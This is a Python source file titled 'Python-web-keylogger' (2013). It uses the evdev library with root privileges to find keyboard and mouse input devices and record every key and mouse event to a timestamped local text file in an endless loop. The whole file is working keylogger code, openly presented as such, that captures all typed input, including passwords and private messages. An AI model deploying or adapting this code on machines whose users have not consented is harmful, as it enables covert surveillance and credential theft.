'''

Author: Gustavo Martin Vela
Python-web-keylogger
2013

Based on the python-evdev library from https://github.com/gvalkov/python-evdev/ 

IT IS NECESSARY TO PLAY THIS SCRIPT WITH ROOT PRIVILEGES (SUDO)

'''

# To install evdev library: sudo pip install evdev
# evdev library webpage: http://pythonhosted.org/evdev/
from evdev import InputDevice, list_devices, categorize, ecodes, resolve_ecodes
# Necessary to read well multiple devices
from select import select
# Regular expressions library to catch the keys inside the events
#import re
import time

#evfmt = 'time {:<16} type {} ({}), code {:<4} ({}), value {}'
minimal_evfmt = '{},{},{}'

# This list is to enter the strings in uppercase that we want to search
wanted_devices_string_list = ["MOUSE", "KEYBOARD"]
# This dictionnary is to save the devices that maps with our strings
interesting_devices_dict = {}
# This mapping maps each device to /dev/input/eventX
devices = map(InputDevice, list_devices())

# Actual time to give name to the text file of records
now = time.time()
textfile_name = "logs_" + str(int(now))
#print textfile_name
# A new list to save only the wanted devices 
wanted_devices_list = []
# Searching in all the devices
for dev in devices:
	# Converting device names to uppercase to process well
	name_upper = dev.name.upper()
	# Iterating over our wanted strings
	for wanted_string in wanted_devices_string_list:
		# Searching our string in the names of the devices
		if wanted_string in name_upper:
			# Saving in the dictionnary
			interesting_devices_dict[wanted_string] = dev
			# Put all the wanted devives in the new tuple
			wanted_devices_list.append(dev.fn)
	#print( '%-20s %-38s %s' % (dev.fn, dev.name, dev.phys) )

# Searching in all the interesting devices
#for key, device in interesting_devices_dict.iteritems():
	# Mapping all the capabilities of the device
	#print "%s\n%s" % (key, device.capabilities(verbose=True))

# Mapping only our interesting devices
devices = map(InputDevice, wanted_devices_list)
devices = {dev.fd : dev for dev in devices}

# This method is derived from evdev examples. It is very useful!
# This method only print from console the events.
def print_event_to_console(e):
        # If the type of the event is a marker to separate events
    if e.type == ecodes.EV_SYN:
        print('{}'.format(ecodes.SYN[e.code]))
        # SYN_MT_REPORT is to Multitouch Devices. In this case it is not necessary for the moment!
        # All these events are well described in https://www.kernel.org/doc/Documentation/input/event-codes.txt
    # If the type of the event is not a marker to separate events
    else:
            # If the type of the event is known in evdev code, print the string associated
        if e.type in ecodes.bytype:
            codename = ecodes.bytype[e.type][e.code]
        # If not, print unknown
        else:
            codename = 'UNKNOWN'
        # Print a message like "EV_MSC,MSC_SCAN,157" or "EV_KEY,KEY_RIGHTCTRL,1"
        print(minimal_evfmt.format(ecodes.EV[e.type], codename, e.value))
        #print(evfmt.format(e.timestamp(), e.type, ecodes.EV[e.type], e.code, codename, e.value))

# This method is derived from evdev examples. It is very useful!
# This method only print from console the events.
#event_ended = False
def print_event_to_txt(e):
	with open(textfile_name + ".txt", "ab") as text_file:
		# If the type of the event is a marker to separate events
	    if e.type == ecodes.EV_SYN:
	        data = '\n'
	        #event_ended = True
	    # If the type of the event is not a marker to separate events
	    else:
	    	#event_ended = False
	    	# If the type of the event is known in evdev code, print the string associated
	        if e.type in ecodes.bytype:
	            codename = ecodes.bytype[e.type][e.code]
	            #print codename
	       	    # if ecodes.EV[e.type] == 'EV_KEY':
	           	#     if codename.startswith('KEY_'):
	           	#     	print codename[4:]
	        # If not, print unknown
	        else:
	            codename = 'UNKNOWN'
	        # Print a message like "EV_MSC,MSC_SCAN,157" or "EV_KEY,KEY_RIGHTCTRL,1"
	        if codename[0] == 'M':
	        	data = "%s " % (e.value)
	        else:	
	        #print(minimal_evfmt.format(ecodes.EV[e.type], codename, e.value))
	        	data = "%s - %s\n" % (codename, e.value)
	        #print(evfmt.format(e.timestamp(), e.type, ecodes.EV[e.type], e.code, codename, e.value))
	    text_file.write(str(data))

# Reporting infinitelly over events from our interesting devices
while True:
	# Interface to Unix select() system call. http://docs.python.org/2/library/select.html
	r,w,x = select(devices, [], [])
	# searching only the interesting devices events 
	for fd in r:
		for event in devices[fd].read():
			# Displaying the events
			#print(repr(event))
			print_event_to_txt(event)	